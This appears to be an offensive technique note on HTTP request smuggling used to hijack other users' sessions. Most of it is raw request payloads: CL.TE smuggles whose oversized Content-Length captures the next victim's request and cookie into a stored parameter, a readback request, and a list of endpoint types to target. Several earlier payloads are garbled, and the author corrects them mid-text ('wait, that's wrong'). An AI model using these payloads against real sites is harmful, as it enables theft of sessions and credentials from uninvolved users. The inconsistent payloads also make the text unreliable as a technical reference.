# Session hijack — stealing the victim's request state

## The shape — the smuggle's empty `Cookie:` takes the victim's

```text
POST / HTTP/1.1
Content-Length: 90

POST /steal HTTP/1.1
Host: t
Content-Length: 100
Cookie: 
```

The smuggle's `Cookie:` is EMPTY — the next victim's request lands after
it — the victim's `Cookie: session=abc` fills the smuggle's `Cookie:`
header — `/steal` runs with the VICTIM's session.

## The mechanism — headers inherit from the next request

The smuggle ends mid-header — the victim's request supplies the rest —
the smuggle's headers are the smuggle's + the victim's:

```text
smuggle's tail:  Cookie: 
victim's start:  GET /home HTTP/1.1\r\nCookie: session=VICTIM

back-end sees:   Cookie: GET /home HTTP/1.1  — wait, that's wrong
```

Actually the smuggle's `Cookie: ` eats the victim's request LINE — the
victim's `GET /home` becomes the Cookie value — the smuggle is malformed.

## The working shape — the smuggle ends before the victim's headers

```text
POST / HTTP/1.1
Content-Length: 100

POST /steal HTTP/1.1
Host: t
Content-Length: 10
```

The smuggle ends cleanly (headers + CL) — the victim's request arrives
NEXT — `/steal` already ran with the smuggle's own headers — the victim's
request becomes the NEXT body — the smuggle needs its own complete
framing and the victim's request is the NEXT thing.

## The working cookie-steal — smuggle's `Content-Length` eats the victim

```text
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
POST /store HTTP/1.1
Host: t
Content-Length: 400

x=
0
```

The smuggle's `Content-Length: 400` is LONGER than `x=` (2 bytes) → the
back-end reads the NEXT 398 bytes as the body — the victim's request
headers land INSIDE `x=` — the victim's `Cookie: session=...` is part
of the smuggle's `x` param → `/store` stores the victim's cookie →
read it back.

## The readback — the smuggle's param IS the victim's request

```text
POST /store HTTP/1.1
Content-Length: 400

x=
```

`x=` + 398 bytes of the NEXT request → the stored `x` carries the victim's
full request — cookie, host, headers — a complete request-steal.

## The session-fixation — your cookie in the victim's slot

```text
POST / HTTP/1.1
Content-Length: 85

GET /home HTTP/1.1
Host: t
Cookie: session=MYOWN
```

The smuggle's `Cookie:` is `session=MYOWN` — but it's the smuggle's own
cookie — doesn't steal. The steal needs the VICTIM's request to land
inside the smuggle's body — the CL-eats-next-request shape.

## The frontend-auth-strip — the proxy strips auth

```text
GET /admin HTTP/1.1
Host: t
```

smuggled behind a request that has no `Authorization` — the front-end
may add its own auth header → the smuggle runs with the FRONT-END's
credentials → internal-route — `internal-routes.md`.

## The capture — the cookie-in-param readback

The victim's request inside `x=` — read it back:

```text
GET /store/last HTTP/1.1
```

→ `x=GET%20/home%20HTTP/1.1%0d%0aHost:%20t%0d%0aCookie:%20session%3DVICTIM%0d%0a`
— the victim's cookie is in `x`.

## The common targets — the readback endpoints

- `/store`, `/log`, `/save`, `/comment` — endpoints that record a param
- a search that echoes the query — `?q=` readback
- a debug/error page that dumps the request

## The defensive check — is the connection shared?

The victim has to be on the same connection — keep-alive shared-socket —
a per-client connection can't be poisoned. Test with the self-poison
first — `response-poisoning.md`.
